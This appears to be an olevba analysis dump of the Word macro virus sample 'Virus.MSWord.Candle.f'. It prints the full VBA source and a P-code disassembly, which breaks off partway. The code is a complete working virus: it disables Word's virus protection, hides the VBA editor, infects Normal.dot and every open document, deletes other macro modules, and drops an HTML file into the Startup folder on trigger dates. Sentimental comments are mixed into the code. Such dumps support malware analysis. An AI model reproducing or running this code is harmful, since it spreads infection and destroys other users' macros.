olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Candle.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Candle.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Candle.bas 
in file: Virus.MSWord.Candle.f - OLE stream: 'Macros/VBA/Candle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' atmospir Indy manis, I N D O N E S I A, awal Nopember 1997
Const siManis = "Candle" ' Gen11.2-II
Dim sebarkanPesankuIni As Boolean ' Let me live in your medias :-(
Dim cDA, anggota, utusan ' Don't kill me, I am weak and harmless..

' M Y  O N L Y  L O V E  S T U C K  O N  A G E T I Q U E T T E
' - -  - - - -  - - - -  - - - - -  - -  - - - - - - - - - - -
'*is it fair?
' saat ge and Ii saling suka and jatuh cinta even kami berdua ingin
' married,  but  her mother  is forbide  our love  yang tulus  tobe
' united, padahal ge and Ii udah sebegitu ehem ehemnya..
'*sounds tragic! how come?
' her mother doesn't like cowo manapun yang nggak lebih tua minimal
' five years than her daughter untuk  pacaran  and married!  beside
' that kelihatannya ada another reason yang ge nggak tahu..
'*well?
' ge memang older than Ii, tapi only 9 months, Ii lahirnya Maret'77
' and ge Juli'76.
'*so what?
' that's not enough! said her mother.
'*and now?
' ge pikir now Ii is trying 'tuk memenuhi her mother's wish, and ge
' jadi takut.. takut Ii jadi berpaling dari cinta kami.. sniff!
'*so?
' apapun yang terjadi bagaimanapun juga ge bakalan berusaha  sampai
' ge dapetin cintanya Ii! karena yang ge tau kalo Ii juga 'gak rela
' wadda ya thinx?
'*you do fall in love, don't you?
' ..iya lah, kalo nggak, mana mungkin you bisa baca ps ps brkt ini!

Sub AutoExec()
  If (Day(Now) = 1) And (WeekDay(Now) = vbFriday) Then
  ' kalo gue bilang gue suka sama kakak kelas gue, gimana?
  ' percuma deh loe nggak bakal tahu biarpun gue kasih tahu namanya..
    CandleA
  ElseIf (Day(Now) = 22) And (WeekDay(Now) = vbFriday) Then
  ' kalau kamu masih .. sama .. lebih baik kamu keluar dari rumah ini
  ' mulai sekarang kamu jangan .. dia lagi!
  ' janji? iya
  ' (and Ii cryin' alone as her mother leavin')
    CandleA
  ' sudahlah, jangan menangis sayang..
  ' Ii sayang,
  ' thanks, your tears menandakan perasaan Ii yang begitu dalam,
  ' ge nggak akan membuat setiap tetes air mata Ii sia - sia,
  ' ge akan menghapus air mata kesedihan yang ada di pelupuk mata
  ' Ii, dan ge akan berusaha membuatnya menjadi linangan air mata
  ' kebahagiaan.. semoga saja..
  ' you are too sweet to let go, I'm too love to loose
  End If
End Sub
Sub AutoOpen()
  If Application.ShowVisualBasicEditor Then
    Application.ShowVisualBasicEditor = False
  End If
  If (Day(Now) = 1) And (WeekDay(Now) = vbFriday) Then
  ' (0251), Jum'at, 1 Agustus 1997, 1400-1530
    CandleA
  ElseIf (Day(Now) = 22) And (WeekDay(Now) = vbFriday) Then
  ' (0251), Jum'at, 22 Agustus 1997, 1630-1800
    CandleA
  ' Yesterday, all my trouble seem so far away
  End If
  CandleN
End Sub
Sub FileSave()
  On Error Resume Next
  ActiveDocument.Save
  CandleD
End Sub
Sub FileSaveAs()
  On Error Resume Next
  With Dialogs(wdDialogFileSaveAs)
    .Format = wdFormatDocument
    If .Display = -1 Then
      ActiveDocument.SaveAs FileName:=.Name, FileFormat:=wdFormatTemplate
      CandleD
    End If
  End With
End Sub
Sub ToolsMacro()
' Candle, Yellow Rose, Indy.. romantism never ends
End Sub
Sub ViewVBcode()
' 3 jam 3 menit 33 detik
' what I want most to you is to get close to you..
End Sub
Sub HelpWordPerfectHelp()
' Mawar Kuning,
' akankah hembusan angin ragu mengarahkan harummu
' berpaling dari cintaku,
' adakah duri mawarmu yang akan menyakitiku,
' yang kutahu pasti pesonamu akan selalu menawanku..
End Sub
Sub ToolsOptions()
  On Error Resume Next
  Options.VirusProtection = True
  Dialogs(wdDialogToolsOptions).Show
  Options.VirusProtection = False
End Sub
Sub AutoClose()
  CandleD ' friends come into lovers
End Sub
Public Sub CandleA()
  Dim RelungHatiku As String
  Application.StatusBar = "Page Reformatting.. (this may take a few minutes)"
  With Application.FileSearch
    .SearchSubFolders = True
    .FileName = "Welcome.EXE"
    .LookIn = "C:\"
    .Execute
    Application.StatusBar = ""
    If .FoundFiles.Count = 1 Then
      RelungHatiku = Left(.FoundFiles(1), Len(.FoundFiles(1)) - 11) & "Start Menu\Programs\StartUp\Jauh di Relung Hatiku.HTM"
  'CDSFRETY7
    
    
    
ppm m

Open RelungHatiku For Output As #1
        Print #1, "<html><head><title>take a look in my eyes, look me into your heart..</title></head>"
        Print #1, "<body text=gray bgcolor=white><basefont size=3>"
        Print #1, "<tt><center><p><font size=+2><b>Jangan padamkan..</b></font><p>"
        Print #1, "ternyata penglihatanku salah non,<br>"
        Print #1, "ternyata kisah kita bukanlah sekedar lampu temaram,<br>"
        Print #1, "ternyata setelah kulihat dari dekat,<br>"
        Print #1, "ternyatisah kita bukanlah sekedar lampu temaram,<br>"
        Print #1, "ternyata sa hanyalah sebatang lilin kecil yang menyala redup<p>"
        Print #1, "duh tiupan angin yang membuat nyalanya semakin meredup membuatku miris,<br>"
        Print #1, "kuletakkan kedua telapak tanganku melingkari nyalanya,<br>"
        Print #1, "melindunginya supaya tiada lagi datang gelapku<p>"
        Print #1, "walau ku berusaha membuang pikiran burukku jauh - jauh,<br>"
        Print #1, "tak urung aku merasakan tiupan perlahan darimu untuk meredupkan nyalanya,<br>"
        Print #1, "hembusanmu menyelinap di jemari tanganku, terasa dingin<br>"
        Print #1, "namun masih kurasakan hangatnya nyala lilin kecil itu<p>"
        Print #1, "jangan kamu hembus nyala lilin itu,<br>"
        Print #1, "lilin kecil itu<p>"
        Print #1, "nyalanya sesekali bergoyang seakan hendak meninggalkan lilin itu,<br>"
        Print #1, "tidakkah kamu lihat, betapa seakan dia berkata kepada kita<br>"
        Print #1, Chr(34) + "jangan padamkan aku... karena aku ada di dalam hatimu... di dalam hati kalian berdua<p>"
        Print #1, "</center></tt><br><font size=-1>buat Ii tersayang di FKG UNPAD 45363,<br>"
        Print #1, "bahkan tulisankupun menjadi kelam, sekelam hatiku yang terombang ambing tiada menentu<br>"
        Print #1, "jadilah kamu lenteraku, lentera yang tiada kan pernah pudar mendampingiku, lentera tempatku menuju...<p>"
        Print #1, "</body></html>"
      Close
    End If
  End With
End Sub
Public Sub CandleN()
  cDA = Application.DisplayAlerts
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False
  On Error GoTo bukanSalahKu
  sebarkanPesankuIni = True
  For Each anggota In NormalTemplate.VBProject.VBComponents
    If Left(anggota.Name, 6) = "Candle" Then
      sebarkanPesankuIni = False
    ElseIf anggota.Name = "ThisDocument" Then
    ElseIf Left(anggota.Name, 2) = "ai" Then
    Else
      Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=anggota.Name, object:=wdOrganizerObjectProjectItems
      Options.SaveNormalPrompt = False
      NormalTemplate.Save
    End If
  Next
  If sebarkanPesankuIni Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=siManis, object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
    NormalTemplate.Save
  End If
bukanSalahKu:
  Application.DisplayAlerts = cDA
  Application.ScreenUpdating = True
End Sub
Public Sub CandleD()
  cDA = Application.DisplayAlerts
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False
  On Error GoTo bukanSalahMuJuga
  For Each utusan In Documents
    sebarkanPesankuIni = True
    For Each anggota In utusan.VBProject.VBComponents
      If Left(anggota.Name, 6) = "Candle" Then
        sebarkanPesankuIni = False
      ElseIf anggota.Name = "ThisDocument" Then
      ElseIf Left(anggota.Name, 2) = "ai" Then
      Else
        Application.OrganizerDelete Source:=utusan.FullName, Name:=anggota.Name, object:=wdOrganizerObjectProjectItems
      End If
    Next
    If sebarkanPesankuIni And (Left(utusan.Name, 3) <> "Doc") Then
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=utusan.FullName, Name:=siManis, object:=wdOrganizerObjectProjectItems
    End If
  Next
  If Left(ActiveDocument.Name, 3) <> "Doc" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
  End If
bukanSalahMuJuga:
  Application.DisplayAlerts = cDA
  Application.ScreenUpdating = True
End Sub

' in the name of love, of Aa & Ii
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Candle.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1117 bytes
' Macros/VBA/Candle - 15675 bytes
' Line #0:
' 	QuoteRem 0x0000 0x003B " atmospir Indy manis, I N D O N E S I A, awal Nopember 1997"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0006 "Candle"
' 	VarDefn siManis
' 	QuoteRem 0x0019 0x000B " Gen11.2-II"
' Line #2:
' 	Dim 
' 	VarDefn sebarkanPesankuIni (As Boolean)
' 	QuoteRem 0x0022 0x001F " Let me live in your medias :-("
' Line #3:
' 	Dim 
' 	VarDefn cDA
' 	VarDefn anggota
' 	VarDefn utusan
' 	QuoteRem 0x0019 0x0028 " Don't kill me, I am weak and harmless.."
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x003D " M Y  O N L Y  L O V E  S T U C K  O N  A G E T I Q U E T T E"
' Line #6:
' 	QuoteRem 0x0000 0x003D " - -  - - - -  - - - -  - - - - -  - -  - - - - - - - - - - -"
' Line #7:
' 	QuoteRem 0x0000 0x000C "*is it fair?"
' Line #8:
' 	QuoteRem 0x0000 0x0042 " saat ge and Ii saling suka and jatuh cinta even kami berdua ingin"
' Line #9:
' 	QuoteRem 0x0000 0x0042 " married,  but  her mother  is forbide  our love  yang tulus  tobe"
' Line #10:
' 	QuoteRem 0x0000 0x0037 " united, padahal ge and Ii udah sebegitu ehem ehemnya.."
' Line #11:
' 	QuoteRem 0x0000 0x0019 "*sounds tragic! how come?"
' Line #12:
' 	QuoteRem 0x0000 0x0042 " her mother doesn't like cowo manapun yang nggak lebih tua minimal"
' Line #13:
' 	QuoteRem 0x0000 0x0042 " five years than her daughter untuk  pacaran  and married!  beside"
' Line #14:
' 	QuoteRem 0x0000 0x003A " that kelihatannya ada another reason yang ge nggak tahu.."
' Line #15:
' 	QuoteRem 0x0000 0x0006 "*well?"
' Line #16:
' 	QuoteRem 0x0000 0x0042 " ge memang older than Ii, tapi only 9 months, Ii lahirnya Maret'77"
' Line #17:
' 	QuoteRem 0x0000 0x0010 " and ge Juli'76."
' Line #18:
' 	QuoteRem 0x0000 0x0009 "*so what?"
' Line #19:
' 	QuoteRem 0x0000 0x0024 " that's not enough! said her mother."
' Line #20:
' 	QuoteRem 0x0000 0x0009 "*and now?"
' Line #21:
' 	QuoteRem 0x0000 0x0042 " ge pikir now Ii is trying 'tuk memenuhi her mother's wish, and ge"
' Line #22:
' 	QuoteRem 0x0000 0x003E " jadi takut.. takut Ii jadi berpaling dari cinta kami.. sniff!"
' Line #23:
' 	QuoteRem 0x0000 0x0004 "*so?"
' Line #24:
' 	QuoteRem 0x0000 0x0042 " apapun yang terjadi bagaimanapun juga ge bakalan berusaha  sampai"
' Line #25:
' 	QuoteRem 0x0000 0x0042 " ge dapetin cintanya Ii! karena yang ge tau kalo Ii juga 'gak rela"
' Line #26:
' 	QuoteRem 0x0000 0x0010 " wadda ya thinx?"
' Line #27:
' 	QuoteRem 0x0000 0x0020 "*you do fall in love, don't you?"
' Line #28:
' 	QuoteRem 0x0000 0x0042 " ..iya lah, kalo nggak, mana mungkin you bisa baca ps ps brkt ini!"
' Line #29:
' Line #30:
' 	FuncDefn (Sub AutoExec())
' Line #31:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #32:
' 	QuoteRem 0x0002 0x0037 " kalo gue bilang gue suka sama kakak kelas gue, gimana?"
' Line #33:
' 	QuoteRem 0x0002 0x0042 " percuma deh loe nggak bakal tahu biarpun gue kasih tahu namanya.."
' Line #34:
' 	ArgsCall CandleA 0x0000 
' Line #35:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #36:
' 	QuoteRem 0x0002 0x0042 " kalau kamu masih .. sama .. lebih baik kamu keluar dari rumah ini"
' Line #37:
' 	QuoteRem 0x0002 0x0028 " mulai sekarang kamu jangan .. dia lagi!"
' Line #38:
' 	QuoteRem 0x0002 0x000B " janji? iya"
' Line #39:
' 	QuoteRem 0x0002 0x002C " (and Ii cryin' alone as her mother leavin')"
' Line #40:
' 	ArgsCall CandleA 0x0000 
' Line #41:
' 	QuoteRem 0x0002 0x0023 " sudahlah, jangan menangis sayang.."
' Line #42:
' 	QuoteRem 0x0002 0x000B " Ii sayang,"
' Line #43:
' 	QuoteRem 0x0002 0x003D " thanks, your tears menandakan perasaan Ii yang begitu dalam,"
' Line #44:
' 	QuoteRem 0x0002 0x003A " ge nggak akan membuat setiap tetes air mata Ii sia - sia,"
' Line #45:
' 	QuoteRem 0x0002 0x003E " ge akan menghapus air mata kesedihan yang ada di pelupuk mata"
' Line #46:
' 	QuoteRem 0x0002 0x003E " Ii, dan ge akan berusaha membuatnya menjadi linangan air mata"
' Line #47:
' 	QuoteRem 0x0002 0x001C " kebahagiaan.. semoga saja.."
' Line #48:
' 	QuoteRem 0x0002 0x0033 " you are too sweet to let go, I'm too love to loose"
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub AutoOpen())
' Line #52:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	IfBlock 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #56:
' 	QuoteRem 0x0002 0x002A " (0251), Jum'at, 1 Agustus 1997, 1400-1530"
' Line #57:
' 	ArgsCall CandleA 0x0000 
' Line #58:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #59:
' 	QuoteRem 0x0002 0x002B " (0251), Jum'at, 22 Agustus 1997, 1630-1800"
' Line #60:
' 	ArgsCall CandleA 0x0000 
' Line #61:
' 	QuoteRem 0x0002 0x002B " Yesterday, all my trouble seem so far away"
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	ArgsCall CandleN 0x0000 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub FileSave())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #68:
' 	ArgsCall CandleD 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Sub FileSaveAs())
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #73:
' 	Ld wdFormatDocument 
' 	MemStWith Format$ 
' Line #74:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #75:
' 	MemLdWith New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #76:
' 	ArgsCall CandleD 0x0000 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	EndWith 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub ToolsMacro())
' Line #81:
' 	QuoteRem 0x0000 0x0031 " Candle, Yellow Rose, Indy.. romantism never ends"
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub ViewVBcode())
' Line #84:
' 	QuoteRem 0x0000 0x0017 " 3 jam 3 menit 33 detik"
' Line #85:
' 	QuoteRem 0x0000 0x0031 " what I want most to you is to get close to you.."
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub HelpWordPerfectHelp())
' Line #88:
' 	QuoteRem 0x0000 0x000E " Mawar Kuning,"
' Line #89:
' 	QuoteRem 0x0000 0x0030 " akankah hembusan angin ragu mengarahkan harummu"
' Line #90:
' 	QuoteRem 0x0000 0x0018 " berpaling dari cintaku,"
' Line #91:
' 	QuoteRem 0x0000 0x002B " adakah duri mawarmu yang akan menyakitiku,"
' Line #92:
' 	QuoteRem 0x0000 0x0033 " yang kutahu pasti pesonamu akan selalu menawanku.."
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub ToolsOptions())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #97:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #98:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub AutoClose())
' Line #101:
' 	ArgsCall CandleD 0x0000 
' 	QuoteRem 0x000A 0x0019 " friends come into lovers"
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Public Sub CandleA())
' Line #104:
' 	Dim 
' 	VarDefn RelungHatiku (As String)
' Line #105:
' 	LitStr 0x0031 "Page Reformatting.. (this may take a few minutes)"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #106:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #107:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #108:
' 	LitStr 0x000B "Welcome.EXE"
' 	MemStWith FileName 
' Line #109:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #110:
' 	ArgsMemCallWith Execute 0x0000 
' Line #111:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #112:
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	FnLen 
' 	LitDI2 0x000B 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0035 "Start Menu\Programs\StartUp\Jauh di Relung Hatiku.HTM"
' 	Concat 
' 	St RelungHatiku 
' Line #114:
' 	QuoteRem 0x0002 0x0009 "CDSFRETY7"
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' 	Ld m 
' 	ArgsCall ppm 0x0001 
' Line #119:
' Line #120:
' 	Ld RelungHatiku 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0053 "<html><head><title>take a look in my eyes, look me into your heart..</title></head>"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "<body text=gray bgcolor=white><basefont size=3>"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "<tt><center><p><font size=+2><b>Jangan padamkan..</b></font><p>"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "ternyata penglihatanku salah non,<br>"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "ternyata kisah kita bukanlah sekedar lampu temaram,<br>"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "ternyata setelah kulihat dari dekat,<br>"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "ternyatisah kita bukanlah sekedar lampu temaram,<br>"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "ternyata sa hanyalah sebatang lilin kecil yang menyala redup<p>"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "duh tiupan angin yang membuat nyalanya semakin meredup membuatku miris,<br>"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "kuletakkan kedua telapak tanganku melingkari nyalanya,<br>"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "melindunginya supaya tiada lagi datang gelapku<p>"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "walau ku berusaha membuang pikiran burukku jauh - jauh,<br>"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "tak urung aku merasakan tiupan perlahan darimu untuk meredupkan nyalanya,<br>"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "hembusanmu menyelinap di jemari tanganku, terasa dingin<br>"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "namun masih kurasakan hangatnya nyala lilin kecil itu<p>"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "jangan kamu hembus nyala lilin itu,<br>"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "lilin kecil itu<p>"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0045 "nyalanya sesekali bergoyang seakan hendak meninggalkan lilin itu,<br>"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "tidakkah kamu lihat, betapa seakan dia berkata kepada kita<br>"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0057 "jangan padamkan aku... karena aku ada di dalam hatimu... di dalam hati kalian berdua<p>"
' 	Add 
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0049 "</center></tt><br><font size=-1>buat Ii tersayang di FKG UNPAD 45363,<br>"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0059 "bahkan tulisankupun menjadi kelam, sekelam hatiku yang terombang ambing tiada menentu<br>"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0068 "jadilah kamu lenteraku, lentera yang tiada kan pernah pudar mendampingiku, lentera tempatku menuju...<p>"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "</body></html>"
' 	PrintItemNL 
' Line #145:
' 	CloseAll 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	EndWith 
' Line #148:
' 	EndSub 
' Line #149:
' 	FuncDefn (Public Sub CandleN())
' Line #150:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St cDA 
' Line #151:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #152:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #153:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #154:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #155:
' 	OnError bukanSalahKu 
' Line #156:
' 	LitVarSpecial (True)
' 	St sebarkanPesankuIni 
' Line #157:
' 	StartForVariable 
' 	Ld anggota 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #158:
' 	Ld anggota 
' 	MemLd New 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "Candle"
' 	Eq 
' 	IfBlock 
' Line #159:
' 	LitVarSpecial (False)
' 	St sebarkanPesankuIni 
' Line #160:
' 	Ld anggota 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	ElseIfBlock 
' Line #161:
' 	Ld anggota 
' 	MemLd New 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "ai"
' 	Eq 
' 	ElseIfBlock 
' Line #162:
' 	ElseBlock 
' Line #163:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anggota 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #164:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #165:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	StartForVariable 
' 	Next 
' Line #168:
' 	Ld sebarkanPesankuIni 
' 	IfBlock 
' Line #169:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld siManis 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #170:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #171:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #172:
' 	EndIfBlock 
' Line #173:
' 	Label bukanSalahKu 
' Line #174:
' 	Ld cDA 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #175:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #176:
' 	EndSub 
' Line #177:
' 	FuncDefn (Public Sub CandleD())
' Line #178:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St cDA 
' Line #179:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #180:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #181:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #182:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #183:
' 	OnError bukanSalahMuJuga 
' Line #184:
' 	StartForVariable 
' 	Ld utusan 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #185:
' 	LitVarSpecial (True)
' 	St sebarkanPesankuIni 
' Line #186:
' 	StartForVariable 
' 	Ld anggota 
' 	EndForVariable 
' 	Ld utusan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #187:
' 	Ld anggota 
' 	MemLd New 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "Candle"
' 	Eq 
' 	IfBlock 
' Line #188:
' 	LitVarSpecial (False)
' 	St sebarkanPesankuIni 
' Line #189:
' 	Ld anggota 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	ElseIfBlock 
' Line #190:
' 	Ld anggota 
' 	MemLd New 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "ai"
' 	Eq 
' 	ElseIfBlock 
' Line #191:
' 	ElseBlock 
' Line #192:
' 	Ld utusan 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anggota 
